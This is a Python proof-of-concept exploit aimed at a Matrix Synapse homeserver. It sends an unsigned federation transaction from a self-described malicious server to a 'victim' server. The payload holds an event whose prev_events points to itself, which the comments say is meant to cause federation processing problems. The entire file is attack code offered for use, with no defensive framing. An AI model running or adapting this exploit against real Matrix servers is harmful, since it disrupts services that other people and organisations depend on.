import json
import requests
import time
import uuid

# Target Synapse server (vulnerable instance)
TARGET_SERVER = "victim.org"

# Attacker's homeserver (controlled malicious instance)
ATTACKER_SERVER = "malicious.org"

# A randomly generated transaction ID
TXN_ID = str(uuid.uuid4())

# Federation endpoint for sending events
FEDERATION_URL = f"https://{TARGET_SERVER}/_matrix/federation/v1/send/{TXN_ID}"

# A malicious event with a self-referencing prev_event (causes federation processing issues)
MALICIOUS_EVENT_ID = f"${uuid.uuid4().hex}"

malicious_payload = {
    "origin": ATTACKER_SERVER,
    "origin_server_ts": int(time.time() * 1000),
    "pdus": [
        {
            "type": "m.room.message",
            "sender": "@attacker:malicious.org",
            "room_id": "!abcdefg:malicious.org",
            "event_id": MALICIOUS_EVENT_ID,
            "prev_events": [[MALICIOUS_EVENT_ID, {}]],  # Cyclic reference
            "auth_events": [],
            "depth": 100,
            "content": {
                "body": "Federation disruption test",
                "msgtype": "m.text"
            }
        }
    ],
    "edus": []
}

# Sending the malicious event via Federation API
response = requests.put(
    FEDERATION_URL,
    json=malicious_payload,  # Proper JSON encoding
    headers={"Content-Type": "application/json"}
)

# Output response from the target server
print(f"Response Status: {response.status_code}")
print(f"Response Body: {response.text}")
